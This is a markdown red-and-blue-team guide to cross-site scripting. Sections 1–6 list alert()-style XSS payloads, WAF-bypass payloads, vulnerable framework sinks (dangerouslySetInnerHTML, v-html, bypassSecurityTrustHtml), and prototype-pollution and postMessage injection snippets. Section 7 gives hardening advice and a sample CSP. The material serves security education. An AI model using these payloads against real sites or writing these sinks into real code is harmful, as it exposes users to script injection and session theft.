# 🛡️ Complete XSS Series – Red & Blue Team Guide

🚀 Created for **Hack Tools Dark Community**

---

## 📖 Table of Contents

1. [XSS Basics and Exploitation](#1-xss-basics-and-exploitation)
2. [Modern WAF Bypass Techniques](#2-modern-waf-bypass-techniques)
3. [XSS in SPAs (React, Angular, Vue)](#3-xss-in-spas-react-angular-vue)
4. [DOM Clobbering & Prototype Pollution + XSS](#4-dom-clobbering--prototype-pollution--xss)
5. [XSS via postMessage, Shadow DOM, and iframe Abuse](#5-xss-via-postmessage-shadow-dom-and-iframe-abuse)
6. [Trusted Types Bypass & iframe Sandbox Escapes](#6-trusted-types-bypass--iframe-sandbox-escapes)
7. [Full Blue Team Hardening Guide](#7-full-blue-team-hardening-guide)

---

## 1. XSS Basics and Exploitation

Cross-Site Scripting (XSS) allows attackers to execute arbitrary JavaScript in user browsers. It's still among the most exploited vulnerabilities today.

### Common Types of XSS
- **Stored XSS**: Injected script is stored and executed when viewed.
- **Reflected XSS**: Script is reflected off the server (e.g., via URL).
- **DOM-Based XSS**: Triggered entirely client-side.

### Example Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">Click</a>
```

---

## 2. Modern WAF Bypass Techniques

### Techniques:
- HTML entity encoding
- Hex/Unicode encoding
- Broken tags
- JavaScript URIs
- `data:` URIs with SVG
- Mutation XSS (mXSS)

### Real Bypass Payloads
```html
<svg><script xlink:href=data:,alert(1)></script></svg>
<iframe srcdoc="<script>alert`1`</script>"></iframe>
<video><source onerror="alert(1)">
```

---

## 3. XSS in SPAs (React, Angular, Vue)

### React:
```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### Vue:
```html
<div v-html="userInput"></div>
```

### Angular:
```ts
this.trust = sanitizer.bypassSecurityTrustHtml(userInput);
```

Other vectors: `localStorage`, route injection, rich text editors.

---

## 4. DOM Clobbering & Prototype Pollution → XSS

### DOM Clobbering
```html
<input name="submit" value="alert(1)">
```

### Prototype Pollution
```js
_.merge({}, JSON.parse('{ "__proto__": { "x": "<img src=x onerror=alert(1)>" } }'));
```

Can lead to poisoned logic and HTML injection.

---

## 5. XSS via postMessage, Shadow DOM, and iframe Abuse

### postMessage XSS
```js
window.addEventListener('message', (e) => {
  document.getElementById('output').innerHTML = e.data;
});
```

### Shadow DOM
```js
el.attachShadow({mode: 'open'}).innerHTML = userInput;
```

### iframe abuse
```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

---

## 6. Trusted Types Bypass & iframe Sandbox Escapes

### Trusted Types Bypass
```js
document.body.innerHTML = String(userInput); // Unsafe wrapper
```

Use DOMPurify in TT mode:
```js
DOMPurify.sanitize(input, {RETURN_TRUSTED_TYPE: true});
```

### Sandbox Escape
```html
<iframe src="evil.html" sandbox="allow-scripts allow-same-origin"></iframe>
```

Avoid combining `allow-scripts` and `allow-same-origin`.

---

## 7. Full Blue Team Hardening Guide

### Defenses:
- DOMPurify for sanitization
- Context-aware escaping
- Content-Security-Policy (CSP)
- Trusted Types
- Safe framework use (no v-html, dangerouslySetInnerHTML)
- Prototype key blacklisting (`__proto__`, `constructor`)
- iframe sandboxing
- Secure cookies (`HttpOnly`, `Secure`, `SameSite`)
- CSP reporting & logging

### Sample CSP Header
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

---

## 🎯 Conclusion

Modern XSS defense and offense require creativity and precision. Whether you're building secure systems or breaking them as a Red Teamer — mastering the full landscape of XSS is essential.
